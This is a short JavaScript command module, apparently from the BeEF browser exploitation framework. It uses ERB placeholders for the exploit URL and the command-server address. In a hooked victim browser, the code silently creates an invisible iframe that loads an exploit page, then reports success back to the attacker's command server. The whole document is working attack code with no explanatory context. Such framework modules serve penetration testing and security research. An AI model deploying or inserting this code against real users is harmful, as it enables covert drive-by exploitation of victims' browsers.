beef.execute(function() {
	var sploit = beef.dom.createInvisibleIframe();
        sploit.src = '<%= @sploit_url %>';
    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
